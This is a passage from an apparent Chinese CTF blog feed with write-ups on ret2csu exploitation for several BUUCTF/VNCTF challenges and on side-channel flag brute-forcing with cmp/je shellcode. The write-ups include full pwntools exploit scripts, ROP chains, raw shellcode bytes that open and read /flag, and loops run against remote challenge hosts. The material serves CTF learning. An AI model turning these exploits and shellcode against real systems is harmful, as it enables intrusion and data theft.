由于第一次输入最多只能输入0x100个字节，因此我们是没法随心所欲构造gadgets的，要考虑长度限制，因为光垃圾数据都填充了0x68个字节。因此需要考虑两点，第一点，我们两次系统调用（第一次调用read第二次调用system），第二次如果再用ret去返回到系统调用，字节是超了的，因此我们第一次ret进行一下系统调用，然后再ret2csu，这一次在call的时候就要想办法去系统调用，可是我们在这个程序里是找不到指向这个地址的地址。</p><p><img src="../img/2706180-20220218172110241-1964520348.png" alt=""></p><p>因此我们这里要用一个巧法，在第一次输入的时候，把syscall的这个地址也给写到bss段，这样bss段的地址就指向了syscall。第二点，还是考虑到字节数的问题，为了构造的payload字节更少，我们在ret2csu第二次执行下面的代码的时候，就不填充成垃圾数据，直接填写成第二次系统调用的参数（如果不这样的话，payload太长了，没法全部输入进去）。</p><p><img src="../img/2706180-20220218172117760-321400513.png" alt=""></p><p>Exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x4007f3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">offset=<span class="number">0x60</span></span><br><span class="line">syscall_addr=<span class="number">0x40077E</span></span><br><span class="line">write_addr=<span class="number">0x400773</span></span><br><span class="line">csu_gadget1=<span class="number">0x4007EA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4007D0</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601060</span></span><br><span class="line">payload=(offset+<span class="number">8</span>)*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(term_proc)<span class="comment">#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数</span></span><br><span class="line">payload+=p64(<span class="number">59</span>)<span class="comment">#r13 rdx #执行一次syscall之后，rax就变成了0x3b</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#r14  #rsi  #将/bin/sh写入bss段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15  #rdi</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#此时用call来执行输入到bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="BUUCTF上的ciscn-2019-es-7">BUUCTF上的ciscn_2019_es_7</h3><p><img src="../img/2706180-20220218171807039-876069338.png" alt=""></p><p><img src="../img/2706180-20220218171817015-1156769220.png" alt=""></p><p>发现程序流程就是两个系统调用，一个是read，一个是write。</p><p><img src="../img/2706180-20220218171824552-2132934623.png" alt=""></p><p>同时发现了这里改变了rax的值，改成了0x3b，也就系统调用execve函数。</p><p>发现只能控制rdi的值，而不能控制rsi,rdx的值</p><p><img src="../img/2706180-20220218171833959-1096288017.png" alt=""></p><p>那思路就出来了。</p><p>我们利用ret2csu控制rsi和rdx参数，最后执行Mov rax,0x3b；syscall即可。</p><p>那只有一个问题了，也是这道题的难点，怎么把rdi存入参数的地址。</p><p>我最开始想的是执行一个ret2csu去把参数给写进bss段，可是我们由于控制不了rax的值，就没办法系统调用号设置成0,。</p><p>那bss段写不了，只能写入程序给我们指定的地方了，可是这就意味着我们需要泄露栈中地址。以前只遇见过程序自己泄露一个栈的地址的，这道题也算是长见识了，见了一种新方法。</p><p>系统调用write的时候，<br><img src="../img/2706180-20220218171846029-2137483481.png" alt=""></p><p>第三个参数是0x30，可是我们发现<br><img src="../img/2706180-20220218171854501-342656814.png" alt=""></p><p>Buf距离栈底仅仅有十个字节。因此write是可以打印出来栈中内容的。并且我们运行程序也可以发现是有端倪的。</p><p><img src="../img/2706180-20220218171903218-1711747126.png" alt=""></p><p>不仅仅打印出来了我们输入的东西，还打印出来了一些乱码。</p><p>我们先简单写一个脚本</p><p><img src="../img/2706180-20220218171915304-1425594620.png" alt=""></p><p>这个脚本就是发送一个1，但是可以看见我们接收的内容。</p><p><img src="../img/2706180-20220218171922519-1774565205.png" alt=""></p><p>此时可以看见我们已经泄露出来了栈的内容。</p><p>我们用gdb看一下</p><p><img src="../img/2706180-20220218171929967-1280624006.png" alt=""></p><p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p><p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了。</p><p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p><p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少。<br><img src="../img/2706180-20220218171939424-200600591.png" alt=""></p><p>F088是泄露的地址，df70是输入存储的首地址（我打算把/bin/sh输入到这个地方）</p><p>然后就没什么了，偏移拿到之后，就可以写exp了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28000</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span> <span class="comment">#这个地址并不是term_proc的地址，而是指向term_proc的地址</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>) <span class="comment">#这个用来筛选一下我们要找的数据</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(term_proc)  <span class="comment">#此时call一个空函数，我们用ret来劫持执行流</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#r13 r14 r15</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(modify_rax)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bin_sh_addr) <span class="comment">#把参数放到rdi里面</span></span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="BUUCTF上的gyctf-2020-borrowstack">BUUCTF上的gyctf_2020_borrowstack</h3><p>这道题，我已经在栈迁移的那篇博客中发过了，这篇里面我就展示一下WP吧，具体细节可以看一下栈迁移的那篇博客。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220416083237696-1901804155.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re2csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于侧信道爆破的学习总结</title>
      <link href="/posts/82a683c0.html"/>
      <url>/posts/82a683c0.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是侧信道爆破？">什么是侧信道爆破？</h2><p>侧信道攻击是一种非常有趣的攻击手法，在pwn中通常为侧信道爆破。我的理解是侧信道爆破是指在程序没有正常回显的情况下通过执行精心构造后的数据，获取一些程序的现象或反馈来确定最终正确的flag，这种反馈比如有程序回显的错误，或者死循环等等。</p><blockquote><p>使用前提：</p><p>1、侧信道爆破需要执行我们编写的shellcode(因为程序中必然无法找到全部对应的gadget)，因此能够写入和执行一定字节的shellcode是必要的</p><p>2、程序在禁用了execve系统调用后，同时关闭了标准输出流后，才有必要使用侧信道爆破。</p><p>3、同时<strong>标准错误不能被关闭</strong>(因为我们需要它来反馈信息)，还必须要保证read可以从指定文件中读取flag，open或者openat系统调用要保证至少有一个可用。</p><p>攻击效果：在程序禁用了部分系统调用并且关闭了正常回显后，通过程序反馈的信息对进行flag逐位爆破。</p></blockquote><h2 id="侧信道爆破的整体思路">侧信道爆破的整体思路:</h2><p>首先需要想办法在程序中写入一段shellcode并且能将其执行。然后我们先执行open系统调用(如果open被禁用的话可以使用openat系统调用)，将flag文件打开返回一个文件描述符，然后用read系统调用将文件中的内容读到一片可读写的内存上，然后布置一段与flag比较的shellcode，这段shellcode的编写思路如下。</p><p>首先核心是用cmp指令将读入内存中的flag取一位来与我们给出的一个字符做对比，如果发现flag取的这一位与我们给出的字符一样就跳回到cmp指令处，因为字符都没变化，cmp比较后还是同样的结果，再次跳转回cmp指令处，这样无限循环程序不会有任何的回显。如果cmp比较后发现flag取一位得到的字符与我们所给的字符不同，就不进行跳转继续往下执行，我们不在后面布置任何的指令，这样程序继续往后执行，最终必然会崩溃。而我们根据程序在一定时间内是否反馈了崩溃信息来判断我们的flag是否判断正确(用je或者jz指令来实现这个跳转)</p><p>上面这段与flag对比的shellcode如下：</p><p><strong>(这段shellcode第一行并不通用，我们需要自己根据题目的情况将flag字符串的首地址放入rax，后面的三行汇编指令才是通用的)</strong>  另外汇编指令本身中的{}自然是非法的，这里所出现的{}是配合python脚本中的format方法(这个{}则是在爆破中的变量，因此需要占位符)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,rsi</span><br><span class="line">mov bl,byte ptr [rax+&#123;&#125;]</span><br><span class="line">cmp bl,&#123;&#125;</span><br><span class="line">je $-3</span><br></pre></td></tr></table></figure><p>第一行就是将flag字符串的首地址给rax(这一行并不通用，根据题目自行修改)。</p><p>第二行将flag中的某一位取出。{}是相对于flag首地址的偏移，用来确定到底是取哪一位。通俗来将第二行的{}决定了正在爆破的是flag的哪一位。</p><p>第三行则将我们给出的字符与flag中的某一位进行比较</p><p>第四行如果cmp比较时，二者不相同就不会跳转。如果相同的话就将跳到当前指令的地址-3的位置，而cmp那个指令的机器码就是三字节，因此-3又回到了cmp执行前。由于我们给出的字符没有变，所以将无限循环下去。</p><p>上述的内容为核心步骤，最后整体的话需要用两个循环嵌套一下，大循环为while 1**(也就是不断循环下去，这个循环每走完一次就说明flag已经爆破出了一位)<strong>，小循环为for循环遍历我们给出flag中可能出现的字符组成的字符串</strong>(这个循环走一次就说明对flag中的某一位进行了判断，如果判断正确的话(也就是陷入了死循环)就break跳出当前循环，否则继续遍历字符串)**</p><p>具体的话结合相关题目练习一下吧</p><h2 id="相关例题：">相关例题：</h2><h3 id="xman-2019-nooocall">xman_2019_nooocall</h3><h4 id="保护策略">保护策略</h4><p><img src="../img/image-20220803100743845.png" alt="image-20220803100743845"></p><p>发现保护全开，并且沙箱禁用了所有的系统调用。</p><h4 id="程序分析">程序分析</h4><p><img src="../img/image-20220803100927931.png" alt="image-20220803100927931"></p><p>虽然系统调用都禁用了，但程序自己将flag读到了v5的位置，因此还是可以使用侧信道爆破的。可以发现程序自己读入了16个字节的shellcode，并将其执行。这就纯纯考的侧信道爆破了，下面就直接放脚本了，毕竟思路啥的上面已经说过了。</p><h4 id="EXP">EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;-abcdefghijl01234567898&quot;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add al, 2</span></span><br><span class="line"><span class="string">sal rax, 32</span></span><br><span class="line"><span class="string">mov bl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">cmp bl, &#123;&#125;</span></span><br><span class="line"><span class="string">jz $-0x3 </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="comment"># debug(p,&#x27;pie&#x27;,0xD87)</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28383</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Your Shellcode &gt;&gt;&#x27;</span>, asm(shellcode.<span class="built_in">format</span>(index, <span class="built_in">list</span>[i])))</span><br><span class="line">        judge = p.recv(timeout=<span class="number">2</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            <span class="comment">#log_info(&#x27;success!&#x27;)</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">    <span class="comment">#log_info(flag)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>​<img src="../img/image-20220803102650387.png" alt="image-20220803102650387"></p><h3 id="ctfshow-卷王杯-checkin">ctfshow-卷王杯-checkin</h3><h4 id="保护策略-v2">保护策略</h4><p><img src="../img/image-20220803103106146.png" alt="image-20220803103106146"></p><p><img src="../img/image-20220803103501444.png" alt="image-20220803103501444"></p><p>这题winmt师傅本意考的是侧信道爆破，但是忘记禁用execve系统调用了哈哈。这里我只记录侧信道爆破的方法。</p><h4 id="漏洞分析：">漏洞分析：</h4><p><img src="../img/image-20220803103711730.png" alt="image-20220803103711730"></p><p>存在一个格式化字符串漏洞，很明显这里肯定是来泄露地址的，然后第二个read上存在溢出，但是溢出字节较少因此肯定要打一个栈迁移，然后我们用%p%25$p来泄露栈地址和libc地址。</p><h4 id="大致思路：">大致思路：</h4><p>迁移到第二次read写入的数据上，先执行mprotect函数让此处的栈区变成可读可写可执行。因为这0x90的字节不够布置rop链的因此再用read系统调用来读入一次数据到栈上(这次数据的数量我们是可控的)。</p><p>接下来的第二次rop链，有两个问题，第一个是open系统调用被禁用了所以我们用openat来代替，第二个问题就是如果执行read系统调用那么它的文件描述符必须是0，因此采用的对抗策略是将标准输入用close关闭，然后再用openat打开flag文件，此时返回的文件描述符就是0了。然后就是read将flag读出来，然后用侧信道爆破的shellcode处理一下即可。</p><p>最后要注意的是openat这个系统调用，如果是绝对路径的话那么直接当成open用就行(不过还得给第一个参数和第三个参数，路径位于第二个参数的位置)，如果是相对路径的话，第二个参数的路径是相对于第一个参数文件描述符的位置来说的，如果想相对于当前工作目录的路径来说的话，需要第一个参数为-100(第三个参数也需要是正常的，具体的话查一下手册或者百度都行)</p><p><img src="../img/image-20220803110340977.png" alt="image-20220803110340977"></p><p>但是不知道为啥，我只要用相对路径的话，openat系统调用也能顺利执行，但是莫名其妙就把我本地的flag文件给删了，我也是很懵，本地的话只能用绝对路径来搞。</p><h4 id="EXP-v2">EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">s=<span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="built_in">list</span>=[<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        p=process(<span class="string">&#x27;./checkin&#x27;</span>)</span><br><span class="line">        <span class="comment">#p=remote(&#x27;pwn.challenge.ctf.show&#x27;,28080)</span></span><br><span class="line">        leave_ret=<span class="number">0x401402</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;Please leave your name :\n&#x27;</span>,<span class="string">&#x27;%p%25$p&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">        leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_libc_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;leak_stack_addr&#x27;)</span></span><br><span class="line">        target_addr=leak_stack_addr+<span class="number">0x10</span></span><br><span class="line">        libc_base_addr=leak_libc_addr-<span class="number">0x271e3</span></span><br><span class="line">        <span class="comment">#log_addr(&#x27;libc_base_addr&#x27;)</span></span><br><span class="line">        <span class="comment">#debug(p,0x401403)</span></span><br><span class="line">        pop_rsi=libc_base_addr+<span class="number">0x2709c</span></span><br><span class="line">        pop_rdx_r12=libc_base_addr+<span class="number">0x11c421</span></span><br><span class="line">        pop_rdi=libc_base_addr+<span class="number">0x26bb2</span></span><br><span class="line">        syscall=libc_base_addr+<span class="number">0x2588d</span></span><br><span class="line">        pop_rax=libc_base_addr+<span class="number">0x28ff4</span></span><br><span class="line">        mprotect=libc_base_addr+<span class="number">0x11bbb0</span></span><br><span class="line">        bin_sh_addr=<span class="number">0x00000000001b6613</span>+libc_base_addr</span><br><span class="line">        rop=p64(pop_rdi)+p64(leak_stack_addr&amp;~<span class="number">0xfff</span>)+p64(pop_rsi)+p64(<span class="number">0x1000</span>)+p64(pop_rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        rop+=p64(pop_rax)+p64(<span class="number">10</span>)+p64(mprotect)+p64(leak_stack_addr+<span class="number">0x68</span>)</span><br><span class="line">        rop+=<span class="string">b&quot;\x48\x89\xE6\x48\xC7\xC7\x00\x00\x00\x00\x48\xC7\xC2\x00\x02\x00\x00\x0F\x05&quot;</span></span><br><span class="line">        payload=rop.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)+p64(target_addr-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Now, please tell us more about you to check in :\n&#x27;</span>,payload)</span><br><span class="line">        rop=<span class="string">b&quot;\x90&quot;</span>*<span class="number">23</span>+<span class="string">&quot;\x6A\x00\x5F\x6A\x03\x58\x0F\x05\x68\x01\x01\x00\x00\x58\x6A\x00\x5A\x6A\x9C\x5F\x48\xBE\x2F\x66\x6C\x61\x67\x00\x00\x00\x56\x54\x5E\x0F\x05\x68\x60\x40\x40\x00\x5E\x6A\x00\x5F\x6A\x30\x5A\x48\x31\xC0\x0F\x05&quot;</span></span><br><span class="line">        shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax,rsi</span></span><br><span class="line"><span class="string">        mov bl,byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp bl,&#123;&#125;</span></span><br><span class="line"><span class="string">        je $-3</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        rop+=asm(shellcode.<span class="built_in">format</span>(index,<span class="built_in">list</span>[i]))</span><br><span class="line">        p.sendline(rop)</span><br><span class="line">        judge=p.can_recv(timeout=<span class="number">3</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> judge:</span><br><span class="line">            log_info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">list</span>[i])</span><br><span class="line">            log_info(flag)</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#log_info(&#x27;wrong!&#x27;)</span></span><br><span class="line">            <span class="comment">#log_info(flag)</span></span><br><span class="line">        <span class="comment">#log(&#x27;i&#x27;,chr(list[i]))</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>我比较喜欢用自己汇编转的机器码，但是机器码的话，各位师傅肯定看的不方便，我这里给一下我rop链机器码对应的汇编指令。填充这么多nop指令是因为我构造的rop链中的read系统调用输入的数据需要nop指令占一下位，才能将有效指令写到执行流上。(可以调read的第二个参数，但我当时懒的弄了，这样省事)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rsi,rsp</span><br><span class="line">mov    rdi,0x0</span><br><span class="line">mov    rdx,0x200</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 3</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line">push 257</span><br><span class="line">pop rax</span><br><span class="line">push 0</span><br><span class="line">pop rdx</span><br><span class="line">push -100</span><br><span class="line">pop rdi</span><br><span class="line">mov rsi, 0x67616c662f</span><br><span class="line">push rsi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">syscall</span><br><span class="line">push 0x404060</span><br><span class="line">pop rsi</span><br><span class="line">push 0</span><br><span class="line">pop rdi</span><br><span class="line">push 0x30</span><br><span class="line">pop rdx</span><br><span class="line">xor rax,rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="../img/image-20220803111703647.png" alt="image-20220803111703647"></p><h2 id="参考文章：">参考文章：</h2><p><a href="https://www.cnblogs.com/LynneHuan/p/15674233.html">roderick师傅的博客</a></p><p><a href="https://www.cnblogs.com/winmt/articles/15943249.html">winmt师傅的博客</a></p><p><a href="https://blog.csdn.net/The_perfect_world/article/details/89280224">https://blog.csdn.net/The_perfect_world/article/details/89280224</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 侧信道爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次简单的远程Getshell（在目标机上开启一个shell）</title>
      <link href="/posts/729cf436.html"/>
      <url>/posts/729cf436.html</url>
      
